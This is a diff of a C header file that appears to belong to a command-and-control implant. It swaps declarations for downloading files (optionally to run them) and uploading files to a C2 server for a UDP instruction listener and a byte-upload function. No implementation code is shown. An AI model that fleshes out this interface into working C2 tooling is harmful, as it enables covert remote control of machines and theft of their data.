@@ -3,55 +3,28 @@
 
 #include "../include/system_utils.h"
 
-#define EXIT_COMMAND "exit\n"
-
-struct sockaddr_in;
 
 /**
- * C2 downloader
+ * UDP Server
  *
- * It downloads data from C2 server web
+ * Waits for instructions from the server
  *
- * ip_addr - String with ip address of the listener
- * response - String with the answer from the server
+ * port - Integer with the port we want to use
  *
- * Returns - OK or ERROR
+ * Returns - The data or NULL in case of error
 */
-int download_data(char *ip_addr, char **response);
-
-/**
- * C2 downloader
- *
- * It downloads files from C2 server web
- *
- * ip_addr - String with ip address of the listener
- *
- * Returns - OK or ERROR
-*/
-int download_file(char *ip_addr, int execute);
+int start_server(int port);
 
 /**
  * C2 uploader
  *
- * It uploads strings to C2 server web
+ * It uploads generic data to the specified ip
  *
  * ip_addr - String with ip address of the listener
- * data - String to send to the server
+ * data - Data to send to the server
  *
- * Returns - OK or ERROR
+ * Returns - The number of bytes sent or -1 in case of error with errno set appropriately
 */
-int upload_data(char *ip_addr, char *data);
-
-/**
- * C2 uploader
- *
- * It uploads files to C2 server web
- *
- * ip_addr - String with ip address of the listener
- * data - File to send to the server
- *
- * Returns - OK or ERROR
-*/
-int upload_file(char *ip_addr, FILE *data);
+size_t upload_data(char *ip_addr, int port, unsigned char *data, size_t len);
 
 #endif
